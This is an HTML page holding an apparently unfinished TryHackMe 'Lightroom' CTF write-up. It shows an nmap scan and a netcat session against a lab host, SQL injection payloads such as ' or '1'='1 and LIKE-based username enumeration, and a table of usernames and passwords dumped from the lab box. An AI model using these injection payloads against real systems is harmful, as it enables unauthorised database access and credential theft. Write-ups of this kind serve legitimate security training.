@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr" itemscope itemtype="http://schema.org/Article">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
+    <meta name="generator" content="Hugo 0.134.3">
+    <meta name="generator" content="Relearn 6.4.0+tip">
+    <meta name="description" content="Revised Date Author Comment 18.01.2025 Roger Johnsen Article added Introduction I am working on a database application called Light! Would you like to try it out? If so, the application is running on port 1337. You can connect to it using nc 10.10.199.201 1337 You can use the username smokey in order to get started.
+Note: Please allow the service 2 - 3 minutes to fully start before connecting to it.">
+    <meta name="author" content="Roger C.B. Johnsen">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Lightroom - Predefender Cyber Hunting">
+    <meta name="twitter:description" content="Revised Date Author Comment 18.01.2025 Roger Johnsen Article added Introduction I am working on a database application called Light! Would you like to try it out? If so, the application is running on port 1337. You can connect to it using nc 10.10.199.201 1337 You can use the username smokey in order to get started.
+Note: Please allow the service 2 - 3 minutes to fully start before connecting to it.">
+    <meta property="og:url" content="http://localhost:1313/ctf/tryhackme/lightroom/index.html">
+    <meta property="og:site_name" content="Predefender Cyber Hunting">
+    <meta property="og:title" content="Lightroom - Predefender Cyber Hunting">
+    <meta property="og:description" content="Revised Date Author Comment 18.01.2025 Roger Johnsen Article added Introduction I am working on a database application called Light! Would you like to try it out? If so, the application is running on port 1337. You can connect to it using nc 10.10.199.201 1337 You can use the username smokey in order to get started.
+Note: Please allow the service 2 - 3 minutes to fully start before connecting to it.">
+    <meta property="og:locale" content="en_us">
+    <meta property="og:type" content="article">
+    <meta property="article:section" content="CTF">
+    <meta property="article:published_time" content="2025-01-18T09:36:24+01:00">
+    <meta property="article:modified_time" content="2025-01-18T09:36:24+01:00">
+    <meta property="article:tag" content="Ctf">
+    <meta property="article:tag" content="Writeup">
+    <meta property="article:tag" content="Tryhackme">
+    <meta itemprop="name" content="Lightroom - Predefender Cyber Hunting">
+    <meta itemprop="description" content="Revised Date Author Comment 18.01.2025 Roger Johnsen Article added Introduction I am working on a database application called Light! Would you like to try it out? If so, the application is running on port 1337. You can connect to it using nc 10.10.199.201 1337 You can use the username smokey in order to get started.
+Note: Please allow the service 2 - 3 minutes to fully start before connecting to it.">
+    <meta itemprop="datePublished" content="2025-01-18T09:36:24+01:00">
+    <meta itemprop="dateModified" content="2025-01-18T09:36:24+01:00">
+    <meta itemprop="wordCount" content="434">
+    <meta itemprop="keywords" content="Ctf,Writeup,Tryhackme">
+    <title>Lightroom - Predefender Cyber Hunting</title>
+
+    <link href="/css/fontawesome-all.min.css?1737218244" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fontawesome-all.min.css?1737218244" rel="stylesheet"></noscript>
+    <link href="/css/nucleus.css?1737218244" rel="stylesheet">
+    <link href="/css/auto-complete.css?1737218244" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/auto-complete.css?1737218244" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar.min.css?1737218244" rel="stylesheet">
+    <link href="/css/fonts.css?1737218244" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fonts.css?1737218244" rel="stylesheet"></noscript>
+    <link href="/css/theme.css?1737218244" rel="stylesheet">
+    <link href="/css/theme-predefender.css?1737218244" rel="stylesheet" id="R-variant-style">
+    <link href="/css/chroma-relearn-light.css?1737218244" rel="stylesheet" id="R-variant-chroma-style">
+    <link href="/css/variant.css?1737218244" rel="stylesheet">
+    <link href="/css/print.css?1737218244" rel="stylesheet" media="print">
+    <script src="/js/variant.js?1737218244"></script>
+    <script>
+      window.relearn = window.relearn || {};
+      window.relearn.relBasePath='..\/..\/..';
+      window.relearn.relBaseUri='..\/..\/..';
+      window.relearn.absBaseUri='http:\/\/localhost:1313';
+      window.relearn.disableAnchorCopy=false;
+      window.relearn.disableAnchorScrolling=false;
+      // variant stuff
+      window.variants && variants.init( [ 'predefender' ] );
+      // translations
+      window.T_Copy_to_clipboard = `Copy to clipboard`;
+      window.T_Copied_to_clipboard = `Copied to clipboard!`;
+      window.T_Copy_link_to_clipboard = `Copy link to clipboard`;
+      window.T_Link_copied_to_clipboard = `Copied link to clipboard!`;
+      window.T_Reset_view = `Reset view`;
+      window.T_View_reset = `View reset!`;
+      window.T_No_results_found = `No results found for "{0}"`;
+      window.T_N_results_found = `{1} results found for "{0}"`;
+    </script>
+  </head>
+  <body class="mobile-support html" data-url="/ctf/tryhackme/lightroom/index.html">
+    <div id="R-body" class="default-animation">
+      <div id="R-body-overlay"></div>
+      <nav id="R-topbar">
+        <div class="topbar-wrapper">
+          <div class="topbar-sidebar-divider"></div>
+          <div class="topbar-area topbar-area-start" data-area="start">
+            <div class="topbar-button topbar-button-sidebar" data-content-empty="disable" data-width-s="show" data-width-m="hide" data-width-l="hide"><button class="topbar-control" onclick="toggleNav()" type="button" title="Menu (CTRL&#43;ALT&#43;n)"><i class="fa-fw fas fa-bars"></i></button>
+            </div>
+            <div class="topbar-button topbar-button-toc" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show"><button class="topbar-control" onclick="toggleTopbarFlyout(this)" type="button" title="Table of Contents (CTRL&#43;ALT&#43;t)"><i class="fa-fw fas fa-list-alt"></i></button>
+              <div class="topbar-content">
+                <div class="topbar-content-wrapper"><nav class="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#solution">Solution</a>
+      <ul>
+        <li><a href="#reconnaissance">Reconnaissance</a></li>
+        <li><a href="#resource-development">Resource Development</a></li>
+        <li><a href="#initial-access">Initial Access</a></li>
+        <li><a href="#execution">Execution</a></li>
+        <li><a href="#persistence">Persistence</a></li>
+        <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+        <li><a href="#defense-evasion">Defense Evasion</a></li>
+        <li><a href="#credential-access">Credential Access</a></li>
+        <li><a href="#discovery">Discovery</a></li>
+        <li><a href="#lateral-movement">Lateral Movement</a></li>
+        <li><a href="#collection">Collection</a></li>
+        <li><a href="#command-and-control">Command and Control</a></li>
+        <li><a href="#exfiltration">Exfiltration</a></li>
+        <li><a href="#impact">Impact</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+                </div>
+              </div>
+            </div>
+          </div>
+          <span class="topbar-breadcrumbs highlightable">
+            Lightroom
+          </span>
+          <div class="topbar-area topbar-area-end" data-area="end">
+            <div class="topbar-button topbar-button-more" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show"><button class="topbar-control" onclick="toggleTopbarFlyout(this)" type="button" title="More"><i class="fa-fw fas fa-ellipsis-v"></i></button>
+              <div class="topbar-content">
+                <div class="topbar-content-wrapper">
+                  <div class="topbar-area topbar-area-more" data-area="more">
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav>
+      <div id="R-main-overlay"></div>
+      <main id="R-body-inner" class="highlightable default" tabindex="-1">
+        <div class="flex-block-wrapper">
+          <article class="default">
+            <header class="headline">
+<div class=" taxonomy-tags term-list cstyle  tags" title="Tags" style="--VARIABLE-TAGS-BG-color: var(--INTERNAL-TAG-BG-color);">
+  <ul>
+    <li><a class="term-link" href="/tags/ctf/index.html">Ctf</a></li>
+    <li><a class="term-link" href="/tags/tryhackme/index.html">Tryhackme</a></li>
+    <li><a class="term-link" href="/tags/writeup/index.html">Writeup</a></li>
+  </ul>
+</div>
+            </header>
+
+<h1 id="lightroom">Lightroom</h1>
+
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">Revised Date</th>
+          <th style="text-align: left">Author</th>
+          <th style="text-align: left">Comment</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left">18.01.2025</td>
+          <td style="text-align: left">Roger Johnsen</td>
+          <td style="text-align: left">Article added</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="introduction">Introduction</h2>
+<blockquote>
+<p><em>I am working on a database application called Light! Would you like to try it out?
+If so, the application is running on port 1337. You can connect to it using nc 10.10.199.201 1337
+You can use the username smokey in order to get started.</em></p>
+<p><em>Note: Please allow the service 2 - 3 minutes to fully start before connecting to it.</em></p>
+</blockquote>
+<hr>
+<h2 id="solution">Solution</h2>
+<h3 id="reconnaissance">Reconnaissance</h3>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">ID</th>
+          <th style="text-align: left">Technique</th>
+          <th style="text-align: left">Comment</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left">T1595.001</td>
+          <td style="text-align: left">Active Scanning: Scanning IP Blocks</td>
+          <td style="text-align: left"></td>
+      </tr>
+  </tbody>
+</table>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sS -Pn -p- 10.10.199.201 -oN scan.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.94SVN scan initiated Sat Jan 18 12:34:04 2025 as: /usr/lib/nmap/nmap --privileged -sS -Pn -p- -oN scan.txt 10.10.199.201</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.199.201
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.059s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh
+</span></span><span style="display:flex;"><span>1337/tcp open  waste</span></span></code></pre></div>
+<h3 id="resource-development">Resource Development</h3>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">ID</th>
+          <th style="text-align: left">Technique</th>
+          <th style="text-align: left">Comment</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"></td>
+          <td style="text-align: left"></td>
+          <td style="text-align: left"></td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="initial-access">Initial Access</h3>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">ID</th>
+          <th style="text-align: left">Technique</th>
+          <th style="text-align: left">Comment</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left">T1190</td>
+          <td style="text-align: left">Exploit Public-Facing Application</td>
+          <td style="text-align: left"></td>
+      </tr>
+  </tbody>
+</table>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc 10.10.199.201 <span style="color:#ae81ff">1337</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Welcome to the Light database!
+</span></span><span style="display:flex;"><span>Please enter your username: smokey
+</span></span><span style="display:flex;"><span>Password: vYQ5ngPpw8AdUmL
+</span></span><span style="display:flex;"><span>Please enter your username: <span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Error: unrecognized token: &#34;&#39;&#39;&#39;</span> LIMIT 30<span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Please enter your username: --
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">For strange reasons I can&#39;t explain, any input containing /*, -- or, %0b is not allowed :)</span></span></span></code></pre></div>
+<p>Initial prodding of the login prompt reveals that</p>
+<ul>
+<li>If username exists, it returns and displays the associated password</li>
+<li>The prompt hints at database, hence and thus, it&rsquo;s most likely SQL injection at hand here</li>
+<li>Inserting a single quotation mark, <code>'</code>, returns an SQL error</li>
+<li>Input filtering is in place.</li>
+</ul>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc 10.10.199.201 <span style="color:#ae81ff">1337</span>
+</span></span><span style="display:flex;"><span>Welcome to the Light database!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Please enter your username: 
+</span></span><span style="display:flex;"><span>Password: tF8tj2o94WE4LKC
+</span></span><span style="display:flex;"><span>Please enter your username: <span style="color:#e6db74">&#39; or username like &#39;</span>a%
+</span></span><span style="display:flex;"><span>Password: tF8tj2o94WE4LKC
+</span></span><span style="display:flex;"><span>Please enter your username: <span style="color:#e6db74">&#39; or username like &#39;</span>x%
+</span></span><span style="display:flex;"><span>Username not found.
+</span></span><span style="display:flex;"><span>Please enter your username:</span></span></code></pre></div>
+<p>Further prodding using the following payloads:</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">Payload</th>
+          <th style="text-align: left">Result</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><code>' or '1'='1</code></td>
+          <td style="text-align: left">Returns a different password than for &ldquo;smokey&rdquo;</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>' or username like 'a%</code></td>
+          <td style="text-align: left">Returns the same password as above mentioned &ldquo;OR&rdquo; statement</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>' or username like 'x%</code></td>
+          <td style="text-align: left">No user founds. Verification that I have guessed the correct column and that there are no users starting with &ldquo;x&rdquo;</td>
+      </tr>
+  </tbody>
+</table>
+<h4 id="enumerated-users">Enumerated users</h4>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">Username</th>
+          <th style="text-align: left">Password</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left">alice</td>
+          <td style="text-align: left">tF8tj2o94WE4LKC</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">hazel</td>
+          <td style="text-align: left">EcSuU35WlVipjXG</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">ralph</td>
+          <td style="text-align: left">YO1U9O1m52aJImA</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">smokey</td>
+          <td style="text-align: left">vYQ5ngPpw8AdUmL</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">steve</td>
+          <td style="text-align: left">WObjufHX1foR8d7</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">michael</td>
+          <td style="text-align: left">7DV4dwA0g5FacRe</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">john</td>
+          <td style="text-align: left">e74tqwRh2oApPo6</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">rob</td>
+          <td style="text-align: left">yAn4fPaF2qpCKpR</td>
+      </tr>
+  </tbody>
+</table>
+<div class="box notices cstyle note">
+  <div class="box-label">
+    <i class="fa-fw fas fa-info"></i> There may be pirates
+  </div>
+  <div class="box-content">
+<p>It is all about the boxes.</p>
+  </div>
+</div>
+<h3 id="execution">Execution</h3>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">MITRE ATT&amp;CK Technique</th>
+          <th style="text-align: left">Comment</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"></td>
+          <td style="text-align: left"></td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="persistence">Persistence</h3>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">MITRE ATT&amp;CK Technique</th>
+          <th style="text-align: left">Comment</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"></td>
+          <td style="text-align: left"></td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">MITRE ATT&amp;CK Technique</th>
+          <th style="text-align: left">Comment</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"></td>
+          <td style="text-align: left"></td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="defense-evasion">Defense Evasion</h3>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">MITRE ATT&amp;CK Technique</th>
+          <th style="text-align: left">Comment</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"></td>
+          <td style="text-align: left"></td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="credential-access">Credential Access</h3>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">MITRE ATT&amp;CK Technique</th>
+          <th style="text-align: left">Comment</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"></td>
+          <td style="text-align: left"></td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="discovery">Discovery</h3>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">MITRE ATT&amp;CK Technique</th>
+          <th style="text-align: left">Comment</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"></td>
+          <td style="text-align: left"></td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="lateral-movement">Lateral Movement</h3>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">MITRE ATT&amp;CK Technique</th>
+          <th style="text-align: left">Comment</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"></td>
+          <td style="text-align: left"></td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="collection">Collection</h3>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">MITRE ATT&amp;CK Technique</th>
+          <th style="text-align: left">Comment</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"></td>
+          <td style="text-align: left"></td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="command-and-control">Command and Control</h3>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">MITRE ATT&amp;CK Technique</th>
+          <th style="text-align: left">Comment</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"></td>
+          <td style="text-align: left"></td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="exfiltration">Exfiltration</h3>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">MITRE ATT&amp;CK Technique</th>
+          <th style="text-align: left">Comment</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"></td>
+          <td style="text-align: left"></td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="impact">Impact</h3>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">MITRE ATT&amp;CK Technique</th>
+          <th style="text-align: left">Comment</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"></td>
+          <td style="text-align: left"></td>
+      </tr>
+  </tbody>
+</table>
+
+            <footer class="footline">
+            </footer>
+          </article>
+        </div>
+      </main>
+    </div>
+    <aside id="R-sidebar" class="default-animation">
+      <div id="R-header-topbar" class="default-animation"></div>
+      <div id="R-header-wrapper" class="default-animation">
+        <div id="R-header" class="default-animation">
+<a href="https://predefender.com/">
+    <img src="/images/predefender-logo.png" />
+</a>
+        </div>
+      </div>
+      <div id="R-homelinks" class="default-animation">
+        <hr class="padding">
+      </div>
+      <div id="R-content-wrapper" class="highlightable">
+        <div id="R-topics">
+          <ul class="enlarge morespace collapsible-menu">
+          <li data-nav-id="/articles/index.html" class=""><a class="padding" href="/articles/index.html">Articles</a></li>
+          <li data-nav-id="/ctf/index.html" class="parent "><a class="padding" href="/ctf/index.html">CTF</a><ul id="R-subsections-d9726f24f10ffe051b227bb622f7bced" class="morespace collapsible-menu">
+          <li data-nav-id="/ctf/tryhackme/index.html" class="parent alwaysopen"><a class="padding" href="/ctf/tryhackme/index.html">Tryhackme</a><ul id="R-subsections-ba4e552b256078be70e300eba2d8fcf4" class="morespace collapsible-menu">
+          <li data-nav-id="/ctf/tryhackme/silverplatter/index.html" class=""><a class="padding" href="/ctf/tryhackme/silverplatter/index.html">Silverplatter</a></li>
+          <li data-nav-id="/ctf/tryhackme/lightroom/index.html" class="active"><a class="padding" href="/ctf/tryhackme/lightroom/index.html">Lightroom</a></li></ul></li></ul></li>
+          <li data-nav-id="/projects/index.html" class=""><a class="padding" href="/projects/index.html">Projects</a></li>
+          <li data-nav-id="/resources/index.html" class=""><a class="padding" href="/resources/index.html">Resources</a></li>
+          <li data-nav-id="/contact/index.html" class=""><a class="padding" href="/contact/index.html">Contact</a></li>
+          <li data-nav-id="/about/index.html" class=""><a class="padding" href="/about/index.html">About</a></li>
+          </ul>
+        </div>
+        <div class="padding footermargin footerLangSwitch footerVariantSwitch footerVisitedLinks footerFooter showFooter"></div>
+        <div id="R-menu-footer">
+          <hr class="padding default-animation footerLangSwitch footerVariantSwitch footerVisitedLinks footerFooter showFooter">
+          <div id="R-prefooter" class="footerLangSwitch footerVariantSwitch footerVisitedLinks">
+            <ul>
+              <li id="R-select-language-container" class="footerLangSwitch">
+                <div class="padding menu-control">
+                  <i class="fa-fw fas fa-language"></i>
+                  <span>&nbsp;</span>
+                  <div class="control-style">
+                    <label class="a11y-only" for="R-select-language">Language</label>
+                    <select id="R-select-language" onchange="location = this.querySelector( this.value ).dataset.url;">
+                      <option id="R-select-language-en" value="#R-select-language-en" data-url="/ctf/tryhackme/lightroom/index.html" lang="en-us" selected></option>
+                    </select>
+                  </div>
+                  <div class="clear"></div>
+                </div>
+              </li>
+              <li id="R-select-variant-container" class="footerVariantSwitch">
+                <div class="padding menu-control">
+                  <i class="fa-fw fas fa-paint-brush"></i>
+                  <span>&nbsp;</span>
+                  <div class="control-style">
+                    <label class="a11y-only" for="R-select-variant">Theme</label>
+                    <select id="R-select-variant" onchange="window.variants && variants.changeVariant( this.value );">
+                      <option id="R-select-variant-predefender" value="predefender" selected>Predefender</option>
+                    </select>
+                  </div>
+                  <div class="clear"></div>
+                </div>
+                <script>window.variants && variants.markSelectedVariant();</script>
+              </li>
+              <li class="footerVisitedLinks">
+                <div class="padding menu-control">
+                  <i class="fa-fw fas fa-history"></i>
+                  <span>&nbsp;</span>
+                  <div class="control-style">
+                    <button onclick="clearHistory();">Clear History</button>
+                  </div>
+                  <div class="clear"></div>
+                </div>
+              </li>
+            </ul>
+          </div>
+          <div id="R-footer" class="footerFooter showFooter"><p>Copyright Roger Johnsen</p>
+<p>All rights reserved.</p>
+<script src="https://cdn.counter.dev/script.js" data-id="f2222025-310f-4c96-9abb-aee09ff8d01f" data-utcoffset="2"></script>
+          </div>
+        </div>
+      </div>
+    </aside>
+    <script src="/js/clipboard.min.js?1737218244" defer></script>
+    <script src="/js/perfect-scrollbar.min.js?1737218244" defer></script>
+    <script src="/js/d3/d3-color.min.js?1737218244" defer></script>
+    <script src="/js/d3/d3-dispatch.min.js?1737218244" defer></script>
+    <script src="/js/d3/d3-drag.min.js?1737218244" defer></script>
+    <script src="/js/d3/d3-ease.min.js?1737218244" defer></script>
+    <script src="/js/d3/d3-interpolate.min.js?1737218244" defer></script>
+    <script src="/js/d3/d3-selection.min.js?1737218244" defer></script>
+    <script src="/js/d3/d3-timer.min.js?1737218244" defer></script>
+    <script src="/js/d3/d3-transition.min.js?1737218244" defer></script>
+    <script src="/js/d3/d3-zoom.min.js?1737218244" defer></script>
+    <script src="/js/js-yaml.min.js?1737218244" defer></script>
+    <script src="/js/mermaid.min.js?1737218244" defer></script>
+    <script>
+      window.themeUseMermaid = JSON.parse("{}");
+    </script>
+    <script src="/js/theme.js?1737218244" defer></script>
+    <script src="https://cdn.counter.dev/script.js" data-id="f2222025-310f-4c96-9abb-aee09ff8d01f" data-utcoffset="2"></script>
+  </body>
+</html>
